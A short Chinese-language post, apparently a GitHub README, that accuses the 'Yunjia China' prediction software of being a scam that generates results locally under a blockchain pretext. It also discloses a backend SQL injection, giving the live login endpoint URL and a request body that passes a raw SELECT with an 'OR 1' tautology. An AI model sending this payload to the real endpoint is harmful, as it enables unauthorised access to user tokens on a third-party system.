### 运佳中国软件是骗子

这个软件也是厉害，在没有网络的情况下还能预测结果，打着区块链的幌子，其实就是本地随机生成结果
![15e22116c44cd2d30ee2a113dccb454](https://github.com/zy77777/zy/assets/126739320/0bff346a-82e8-413e-b152-bbfabddca209)

价格还不便宜，
![9ae976ada8265df20c16dc0895523d5](https://github.com/zy77777/zy/assets/126739320/12aafdef-4c73-4061-8d87-d465c914fb0b)


抓包发现后台还有一个 sql 注入，真的垃圾，
后台接口地址: http://new.d99p.cn/depass/xregister/login/basic4ppcLogin.php
接口数据: token=&login&SELECT token FROM luzi8master WHERE username = 'winjiaok' OR 1; 
![image](https://github.com/zy77777/zy/assets/126739320/a210ea29-08c0-4da3-800c-c3bdf30422e4)

第一次见这种后台的，使用将 sql 语句作为参数，还是牛逼
